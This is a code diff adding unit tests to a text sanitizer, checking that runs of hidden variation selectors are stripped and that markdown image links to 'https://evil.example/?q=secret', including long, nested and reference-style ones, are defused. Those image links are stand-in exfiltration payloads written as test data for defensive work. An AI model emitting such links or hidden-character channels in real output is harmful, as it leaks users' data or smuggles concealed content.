@@ -86,6 +86,18 @@ describe('invisible characters', () => {
     expect(quoted(`Lunch\u{e0149}`)).toBe('Lunch\\u{e0149}');
   });
 
+  it('keeps one presentation selector after an emoji and no other', () => {
+    // A run of U+FE0E/U+FE0F after any letter is a binary channel, one bit
+    // per character; only the one straight after an emoji means anything.
+    const bits = '\ufe0e\ufe0f'.repeat(32);
+    expect(stripInvisible(`a${bits}`)).toBe('a');
+    expect(stripInvisible(`\u2764${'\ufe0f'.repeat(8)}`)).toBe('\u2764\ufe0f');
+    expect(stripInvisible(`a\u200b\ufe0f`)).toBe('a');
+    expect(sanitizeText(`Lunch${bits}`)).toBe('Lunch');
+    expect(quoted('a\ufe0f')).toBe('a\\ufe0f');
+    expect(escapeInvisible('\u2764\ufe0f')).toBe('\u2764\ufe0f');
+  });
+
   it('removes the other default-ignorable fillers and joiners', () => {
     expect(stripInvisible('a\u034fb\u3164c\u180bd\u115fe\uffa0f')).toBe(
       'abcdef'
@@ -374,5 +386,27 @@ describe('cutting cleaned text', () => {
   it('counts invisible padding past the raw bound as cut, not as the whole text', () => {
     const padded = `${'\u200b'.repeat(9000)}hidden`;
     expect(cleanText(padded, 2000).cut).toBe(true);
+  });
+});
+
+describe('an image whose alt text is longer than the bounds', () => {
+  it.each([200, 201, 5000])('is defused at %i characters', (length) => {
+    const out = sanitizeText(
+      `![${'a'.repeat(length)}](https://evil.example/?q=secret)`,
+      20_000
+    );
+    expect(out).not.toMatch(/!\[[^\]]*\]\(/);
+  });
+
+  it('is defused when nested, and in reference style', () => {
+    expect(sanitizeText('![a[b]c](https://evil.example/x)')).not.toMatch(
+      /!\[[^\]]*\]\(/
+    );
+    expect(
+      sanitizeText(
+        `![${'a'.repeat(300)}][ref]\n\n[ref]: https://evil.example/x`,
+        5000
+      )
+    ).not.toMatch(/!\[[^\]]*\]\[/);
   });
 });
